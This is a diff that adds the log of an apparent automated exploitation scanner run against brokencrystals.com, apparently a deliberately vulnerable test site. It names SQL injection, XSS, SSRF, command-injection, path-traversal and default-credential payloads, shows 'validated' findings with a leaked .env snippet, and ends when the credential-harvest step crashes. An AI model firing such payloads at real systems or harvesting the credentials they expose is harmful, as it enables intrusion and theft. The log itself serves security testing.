@@ -1,0 +1,349 @@
+╔══════════════════════════════════════════════════════════════╗
+║       ODINFORGE CORE V2 — FORENSIC TRACE                   ║
+╚══════════════════════════════════════════════════════════════╝
+Target: https://brokencrystals.com
+Started: 2026-03-22T05:03:36.836Z
+
+═══ STAGE 1: ACTIVE EXPLOIT ENGINE ═══
+
+  [active-exploit:initializing] 0% — Starting active exploitation engine
+  [active-exploit:crawl] 10% — Crawling target for endpoints
+[AEE:precheck] Target reachable: https://brokencrystals.com (HTTP 200)
+  [SURFACE] endpoint: / — GET / — HTTP 200
+  [active-exploit:crawl] 10.1% — Discovered 1 endpoints (depth 1/3)
+  [active-exploit:exploit] 30% — Testing 10 endpoints
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+  [active-exploit:exploit] 55% — 5/10 endpoints tested, 0 validated findings
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' UNION SE"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND 1=1--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND EXTR"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "' AND SLEEP(5)--" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ''', "'; SELECT "... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<script>al"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected non-whitespace character after JSON at position 22
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '<', "<svg onloa"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'j', "jaVasCript"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://169"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'h', "http://127"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token ';', "; id; echo"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '`', "`id`" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '|', "| cat /etc/passwd" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "../../../../.env" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '.', "..\..\..\."... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'e', "eyJhbGciOi"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'a', "admin:admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token '/', "/..;/admin" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-HTTP-Met"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'i', "id=1" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'u', "userId=000"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 's', "secret" is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+[AEE:exploit] JSON parse fallback for payload, using form encoding: Unexpected token 'X', "X-Forwarde"... is not valid JSON
+  [active-exploit:exploit] 80% — 10/10 endpoints tested, 5 validated findings
+  [active-exploit:harvest] 80% — Extracting credentials from exploit results
+  [active-exploit:paths] 90% — Building attack paths from findings
+  [active-exploit:complete] 100% — Exploitation complete
+
+── Crawl Results ──
+  Endpoints discovered: 10
+  Technologies: (none)
+  Sitemap found: true
+  Robots.txt found: true
+  API spec found: true
+
+── Exploit Summary ──
+  Total attempts: 465
+  Total validated: 5
+  Total credentials: 3
+  Attack paths found: 2
+  Duration: 34126ms
+
+── Endpoints (first 20) ──
+  GET / [0 params] 
+  GET /admin [0 params] 
+  GET /login [0 params] 
+  GET /register [0 params] 
+  GET /api/config [3 params] 
+  GET /graphql [2 params] 
+  GET /.env [0 params] 
+  GET /debug [0 params] 
+  GET /console [0 params] 
+  GET /api/users/me [3 params] 
+
+── Validated Exploits ──
+  ✓ api_abuse @ https://brokencrystals.com/graphql
+    Payload: GraphQL introspection
+    Status: HTTP 200
+    Confidence: 0.8999999999999999
+    Evidence: GraphQL introspection confirmed on data — 3 pattern matches, 0 data items extracted
+    Response (first 200): {"data":{"__schema":{"types":[{"name":"Testimonial","fields":[{"name":"name","type":{"name":null}},{"name":"title","type":{"name":null}},{"name":"message","type":{"name":null}}]},{"name":"String","fie
+
+  ✓ api_abuse @ https://brokencrystals.com/graphql
+    Payload: GraphQL introspection
+    Status: HTTP 200
+    Confidence: 0.8999999999999999
+    Evidence: GraphQL introspection confirmed on errors — 3 pattern matches, 0 data items extracted
+    Response (first 200): {"data":{"__schema":{"types":[{"name":"Testimonial","fields":[{"name":"name","type":{"name":null}},{"name":"title","type":{"name":null}},{"name":"message","type":{"name":null}}]},{"name":"String","fie
+
+  ✓ ssrf @ https://brokencrystals.com/.env?input=http%3A%2F%2F127.0.0.1%3A80%40evil.com%2F
+    Payload: SSRF via URL redirect
+    Status: HTTP 200
+    Confidence: 0.6
+    Evidence: SSRF via URL redirect confirmed on input — 2 pattern matches, 0 data items extracted
+    Response (first 200): APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=r
+
+  ✓ path_traversal @ https://brokencrystals.com/.env?input=..%2F..%2F..%2F..%2F.env
+    Payload: Path traversal (env file)
+    Status: HTTP 200
+    Confidence: 0.6
+    Evidence: Path traversal (env file) confirmed on input — 2 pattern matches, 0 data items extracted
+    Response (first 200): APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=r
+
+  ✓ path_traversal @ https://brokencrystals.com/.env?input=..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts
+    Payload: Path traversal (Windows)
+    Status: HTTP 200
+    Confidence: 0.6
+    Evidence: Path traversal (Windows) confirmed on input — 2 pattern matches, 0 data items extracted
+    Response (first 200): APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=r
+
+
+── Harvested Credentials ──
+/Users/dre/prod/OdinForge-AI/core-v2-baseline/forensic-trace.ts:102
+    console.log(`  ${c.type}: ${c.value.slice(0, 30)}... (source: ${c.source})`);
+                                        ^
+
+
+TypeError: Cannot read properties of undefined (reading 'slice')
+    at <anonymous> (/Users/dre/prod/OdinForge-AI/core-v2-baseline/forensic-trace.ts:102:41)
+    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
+
+Node.js v20.19.6
